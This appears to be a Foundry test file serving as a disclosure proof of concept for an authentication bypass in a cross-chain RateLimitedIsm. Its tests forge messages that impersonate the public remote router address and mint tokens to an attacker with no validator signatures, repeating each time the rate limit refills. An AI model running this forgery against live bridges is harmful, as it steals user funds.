// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";

import {TestMailbox} from "contracts/test/TestMailbox.sol";
import {RateLimitedIsm} from "contracts/isms/warp-route/RateLimitedIsm.sol";
import {HypERC20} from "contracts/token/HypERC20.sol";
import {TokenMessage} from "contracts/token/libs/TokenMessage.sol";
import {TypeCasts} from "contracts/libs/TypeCasts.sol";
import {MessageUtils} from "./IsmTestUtils.sol";

/**
 * PoC: RateLimitedIsm.verify() performs no authentication of message origin/
 * sender/content. Its only "security" check is `_isDelivered(id)`, i.e.
 * `mailbox.delivered(id)`. In Mailbox.process(), `deliveries[_id]` is set
 * (EFFECTS) *before* `ism.verify()` is called (INTERACTIONS) -- so by the
 * time any ISM's verify() runs, delivered() is already true for that id,
 * regardless of whether the message is legitimate. As a result, any address
 * can call the mailbox's permissionless `process()` with a fully forged
 * message and have RateLimitedIsm accept it, as long as the amount fits in
 * the current rate-limit bucket.
 *
 * The remaining obstacle is `Router.handle()`'s own
 * `require(_router == _sender)` check -- but the enrolled remote router
 * address is public on-chain data (`routers(domain)`), not a secret. The
 * attacker doesn't need to compromise the remote chain's router or any
 * validator key: they just copy that public address into the `sender`
 * field of a locally-submitted forged message. This PoC enrolls a remote
 * router exactly as a real deployment would (`enrollRemoteRouter`), then
 * has an unrelated attacker EOA forge a message impersonating that public
 * address and mint themselves tokens with empty ISM metadata -- no
 * relayer, no validator signatures, no real cross-chain message at all.
 */
contract RateLimitedIsm_AuthBypass_PoC is Test {
    using TypeCasts for address;

    uint32 constant LOCAL_DOMAIN = 100;
    uint32 constant REMOTE_DOMAIN = 1;
    uint256 constant MAX_CAPACITY = 1_000_000 ether;

    TestMailbox mailbox;
    HypERC20 warpToken;
    RateLimitedIsm ism;

    // Public, legitimate remote router address -- e.g. published in the
    // Hyperlane registry/warp-route config. The attacker below never
    // controls it or any of its keys.
    address legitRemoteRouter = makeAddr("legit-remote-router");
    address attacker = makeAddr("attacker");

    function setUp() public {
        mailbox = new TestMailbox(LOCAL_DOMAIN);

        warpToken = new HypERC20(18, 1, 1, address(mailbox));
        warpToken.initialize(
            0,
            "Test USD",
            "tUSD",
            address(0),
            address(0),
            address(this)
        );
        warpToken.enrollRemoteRouter(
            REMOTE_DOMAIN,
            legitRemoteRouter.addressToBytes32()
        );

        // RateLimitedIsm set as the warp route's *sole* ISM -- exactly the
        // configuration exercised by the project's own RateLimitedIsm.t.sol
        // (`testRecipient.setInterchainSecurityModule(address(rateLimitedIsm))`).
        ism = new RateLimitedIsm(
            address(mailbox),
            MAX_CAPACITY,
            address(warpToken)
        );
        warpToken.setInterchainSecurityModule(address(ism));
    }

    function test_forgedMessageMintsTokensWithNoValidSignature() public {
        uint256 stolenAmount = 500_000 ether; // within the rate-limit bucket

        assertEq(warpToken.balanceOf(attacker), 0);

        bytes memory forgedBody = TokenMessage.format(
            attacker.addressToBytes32(),
            stolenAmount
        );

        // Sender/origin impersonate the real enrolled router using only its
        // public address -- the attacker holds no key for it and never
        // interacts with the remote chain.
        bytes memory forgedMessage = MessageUtils.formatMessage(
            3, // Mailbox.VERSION
            0,
            REMOTE_DOMAIN,
            legitRemoteRouter.addressToBytes32(),
            LOCAL_DOMAIN,
            address(warpToken).addressToBytes32(),
            forgedBody
        );

        // Empty metadata: no merkle proof, no validator signatures.
        vm.prank(attacker);
        mailbox.process(bytes(""), forgedMessage);

        assertEq(
            warpToken.balanceOf(attacker),
            stolenAmount,
            "attacker minted tokens via a forged message with no ISM verification"
        );
    }

    function test_canRepeatUpToRefillRateForever() public {
        // Drain most of the bucket in one shot (leave headroom below
        // maxCapacity() to avoid the bucket's own integer-division dust).
        uint256 amount = MAX_CAPACITY / 2;
        _forgeAndProcess(1, amount);
        assertEq(warpToken.balanceOf(attacker), amount);

        // Bucket refills over time (refillRate = MAX_CAPACITY / 1 days) --
        // the attacker can simply repeat this indefinitely, once per
        // refill window, forever.
        vm.warp(block.timestamp + 1 days);

        _forgeAndProcess(2, amount);
        assertEq(warpToken.balanceOf(attacker), 2 * amount);
    }

    function _forgeAndProcess(uint32 nonce, uint256 amount) internal {
        bytes memory body = TokenMessage.format(
            attacker.addressToBytes32(),
            amount
        );
        bytes memory message = MessageUtils.formatMessage(
            3,
            nonce,
            REMOTE_DOMAIN,
            legitRemoteRouter.addressToBytes32(),
            LOCAL_DOMAIN,
            address(warpToken).addressToBytes32(),
            body
        );
        vm.prank(attacker);
        mailbox.process(bytes(""), message);
    }
}
